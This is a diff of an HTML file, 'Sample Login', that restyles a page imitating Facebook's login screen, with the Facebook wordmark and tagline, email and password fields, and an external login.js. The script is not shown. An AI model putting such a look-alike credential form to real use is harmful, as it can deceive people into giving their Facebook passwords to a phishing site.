@@ -1,8 +1,7 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sample Login</title>
   <link rel="stylesheet" href="login.css">
 </head>
@@ -10,24 +9,33 @@
 
 <div class="container">
 
-  <div class="login-header">
-    <!-- Facebook logo -->
-    <img src="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5Cfy.svg" alt="Facebook" class="fb-logo">
-    <h1>Facebook</h1>
-    <p> connects people and helps you stay in touch.</p>
+  <div class="left">
+    <h1>facebook</h1>
+    <p> Connect with friends and the world around you on Facebook.</p>
   </div>
 
-  <div class="login-box">
-    <input type="text" placeholder="Email address or phone number" id="email">
-    <input type="password" placeholder="Password" id="password">
-    <button id="loginBtn">Log In</button>
-    <a href="#">Forgotten password?</a>
-    <hr>
-    <button class="create-btn">Create new account</button>
+  <div class="right">
+    <div class="login-box">
+      
+      <input type="text" placeholder="Email address or phone number" id="email">
+      <input type="password" placeholder="Password" id="password">
+      
+      <button id="loginBtn">
+  <span id="btnText">Log In</span>
+  <span id="btnLoader" class="btn-loader"></span>
+</button>
+
+      <a href="#">Forgotten password?</a>
+
+      <hr>
+
+      <button class="create-btn">Create new account</button>
+
+    </div>
   </div>
 
 </div>
 
-<script src="login.js"></script>
+<script type="module" src="login.js"></script>
 </body>
 </html>
